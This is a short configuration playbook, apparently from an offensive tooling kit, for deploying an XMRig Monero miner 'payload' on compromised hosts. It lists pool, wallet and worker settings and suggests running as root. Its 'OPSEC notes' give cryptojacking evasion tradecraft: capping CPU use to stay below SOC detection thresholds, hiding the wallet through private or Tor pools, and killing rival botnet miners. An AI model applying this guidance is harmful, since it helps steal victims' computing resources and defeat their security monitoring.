---
name: mining-pool-configuration
description: XMRig/XMRigCC pool, wallet, worker, and TLS configuration for Monero CPU mining
domain: cybersecurity
subdomain: cryptomining
tags: [xmrig, monero, mining, stratum, pool]
version: '1.0'
nist_csf: []
mitre_attack: [T1496]
---

## When to use

When deploying the xmrig or xmrigcc miner payload. The miner needs a pool
URL, a Monero wallet address, and a worker name to start mining.

## Configuration

Required variables (set via `honeywatch setup` or `--var`):
- **pool**: stratum+tcp://pool.example.org:3333 (or ssl:// for TLS)
- **wallet**: 4...xmr... (Monero wallet address — 95 chars starting with 4)
- **worker**: honeywatch (or any identifier — shows up in pool dashboard)

Optional:
- **threads**: 0 = auto-detect (use all cores). Set to N to limit.
- **tls**: true for encrypted stratum (port 4444 typically)
- **run_user**: root (or a service account — root avoids permission issues)
- **pass**: x (pool password — usually "x" for anonymous pools)

## OPSEC notes

- **CPU throttling**: set `CPUQuota=70%` in systemd_persist to avoid 100% CPU
  (the #1 SOC detection signal for cryptojacking)
- **Nice level**: set `Nice=10` so real workloads win scheduling
- **Pool selection**: use a private pool or a pool with Tor support to avoid
  the wallet address appearing in public pool dashboards
- **Kill competitors**: run `kill_miners` first — a host already running
  another botnet's miner splits CPU and draws SOC attention